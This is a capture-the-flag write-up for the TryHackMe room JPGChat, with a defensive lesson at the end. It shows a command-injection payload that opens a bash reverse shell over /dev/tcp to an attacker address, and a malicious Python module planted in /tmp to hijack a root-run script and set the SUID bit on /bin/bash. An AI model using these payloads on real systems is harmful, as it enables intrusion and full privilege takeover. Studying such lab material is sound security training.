# CTF Write-up: JPGChat — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | JPGChat |
| **Difficulty** | Easy |
| **Tags**       | `Python` `OS Command Injection` `Sudo` `PYTHONPATH Hijacking` |

---

## Introduction

JPGChat is a deceptively simple room built around a custom Python chat service that was clearly written by someone who prioritized speed over security. The room's tagline — "exploit a poorly made custom chatting service written in a certain language" — gives you everything you need to know going in. Once you spot the vulnerability it's satisfying, and the privilege escalation is a clean PYTHONPATH hijacking demo.

---

## Step 1 — Reconnaissance (Nmap)

```bash
sudo nmap -sS -Pn -T4 -p- <target-ip>
```

Two ports came back open:

- **Port 22** — SSH
- **Port 3000** — Custom service (`ppp` in initial scan, reveals itself as a Python chat application on deeper inspection)

Ran a follow-up version scan on both:

```bash
sudo nmap -O -A -Pn -T4 -p22,3000 <target-ip>
```

Port 3000 is the Python chat service. No web browser needed — this one talks through a socket connection.

---

## Step 2 — Probing the Chat Service

Connected directly with Netcat:

```bash
nc <target-ip> 3000
```

The service presented a simple prompt asking if I wanted to discuss anything and offered a few interaction options. It felt like a minimal chat client. Poked around the menu options to understand how the service behaved.

One thing became clear pretty quickly: when the service processed certain inputs, it seemed to be passing them straight into an OS-level call without any sanitisation. Classic sign of `os.system()` being used with user-controlled data.

---

## Step 3 — Command Injection → Reverse Shell

Tested for injection with a simple command separator first to confirm the vulnerability. Once confirmed, crafted a full reverse shell payload.

Set up a Netcat listener on the attack machine:

```bash
nc -nvlp 4444
```

Submitted the injection payload through the chat service:

```
test
SHOW TIPS
| bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
```

The shell connected back. We're in as a low-privilege user.

```bash
cat /home/<user>/user.txt
```

> **FLAG:** `[user flag here]`

---

## Step 4 — Privilege Escalation (PYTHONPATH Hijacking)

First thing after landing the shell:

```bash
sudo -l
```

The output showed something interesting:

```
(root) NOPASSWD: /usr/bin/python3 /opt/scratchpad/chat.py
```

The user could run a specific Python script as root without a password. That's a setup for Python library hijacking.

I checked what modules the script imported:

```bash
cat /opt/scratchpad/chat.py
```

The script imported a module (let's say "compare") near the top. Python's import resolution checks the current working directory before system library paths. If we create a malicious file with the same name as the imported module in a directory we control, and run the script from there, Python loads our file instead.

Created a malicious Python file in `/tmp`:

```bash
cd /tmp
nano compare.py
```

Contents of `compare.py`:

```python
import os
os.system("chmod +s /bin/bash")
```

Now ran the privileged script from `/tmp`:

```bash
sudo /usr/bin/python3 /opt/scratchpad/chat.py
```

Python picked up our malicious `compare.py`, ran it as root, and set the SUID bit on `/bin/bash`.

```bash
/bin/bash -p

whoami
# root
```

---

## Step 5 — Root Flag

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

Two clean steps:

1. OS command injection in the custom chat service (`os.system()` with unsanitised user input) gave us the initial shell.
2. Sudo rule allowing `python3` with a specific script was exploited via PYTHONPATH hijacking — Python loaded our malicious module instead.

Key defensive lesson: if you're calling system commands from Python, use `subprocess` with a list of arguments — never concatenate user input into an `os.system()` call. And sudo rules on interpreted scripts always need extra scrutiny.
